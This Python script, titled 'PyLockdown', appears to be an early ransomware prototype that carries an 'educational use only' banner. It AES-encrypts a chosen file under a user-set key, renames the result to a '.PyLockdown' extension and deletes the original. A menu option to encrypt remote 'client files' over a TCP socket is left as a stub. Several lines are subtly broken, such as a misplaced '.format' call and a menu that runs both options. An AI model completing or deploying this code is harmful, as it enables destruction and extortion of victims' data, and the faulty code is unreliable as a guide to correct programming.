import os
import time
from random import randint
import sys
import random
import string
import pyAesCrypt

class Crypto:
    bufferSize = 64 * 1024
    password = ''
    def Local(self):
        print('''
1. Encrypt file
2. List files in target directory''')
        choice = int(input('Please select an option.'))
        if choice == 1:
            file = input('Enter file:')
            print('[+] Encrypting file...')
            try:
                pyAesCrypt.encryptFile(file, "{}" + ".PyLockdown", Crypto.password, Crypto.bufferSize).format(file)
            except:
                print('[+] Failed to encrpyt file')
            print('[+] File encrypted')
            os.remove(file)
            print('[+] Original file removed')
        elif choice == 2:
            path = input('Enter path:')
            list = os.listdir(path)
            dirList = []
            dirList.append(list)
            pyAesCrypt.encryptFile(dirList, "{}" + ".PyLockdown", Crypto.password, Crypto.bufferSize).format(dirList)
            print('[+] Directory encrypted')
    def Target(self):
        choice = input('Launch TCP socket connection?')
        if choice == 'y':
            pass # Socket connection setup to be done later
        else:
            pass

class Boot:
    def Banner(self):
        print('''
 _______             __                           __              __                                   
|       \           |  \                         |  \            |  \                                  
| $$$$$$$\ __    __ | $$       ______    _______ | $$   __   ____| $$  ______   __   __   __  _______  
| $$__/ $$|  \  |  \| $$      /      \  /       \| $$  /  \ /      $$ /      \ |  \ |  \ |  \|       \ 
| $$    $$| $$  | $$| $$     |  $$$$$$\|  $$$$$$$| $$_/  $$|  $$$$$$$|  $$$$$$\| $$ | $$ | $$| $$$$$$$|
| $$$$$$$ | $$  | $$| $$     | $$  | $$| $$      | $$   $$ | $$  | $$| $$  | $$| $$ | $$ | $$| $$  | $$
| $$      | $$__/ $$| $$_____| $$__/ $$| $$_____ | $$$$$$\ | $$__| $$| $$__/ $$| $$_/ $$_/ $$| $$  | $$
| $$       \$$    $$| $$     \\$$    $$ \$$     \| $$  \$$\ \$$    $$ \$$    $$ \$$   $$   $$| $$  | $$
 \$$       _\$$$$$$$ \$$$$$$$$ \$$$$$$   \$$$$$$$ \$$   \$$  \$$$$$$$  \$$$$$$   \$$$$$\$$$$  \$$   \$$
          |  \__| $$                                                                                   
           \$$    $$                                                                                   
            \$$$$$$                                                                                    

Copyright (C) 2018 DunkinPirate Software
All Rights Reserved
============================================
This software is for educational use only.
============================================''')
    def SetKey(self):
        key = input('Set decryption key:')
        Crypto.password = key
        print('Your Key: {}'.format(Crypto.password))
    def Menu(self):
        print('''
1. Encrypt local files
2. Encrypt client files through TCP socket connection''')
        choice = int(input('Please select an option.'))
        choice = {
            1 : Crypto().Local(),
            2 : Crypto().Target()
        }

def main():
    Boot().Banner()
    Boot().SetKey()
    Boot().Menu()

if __name__ == "__main__":
    main()
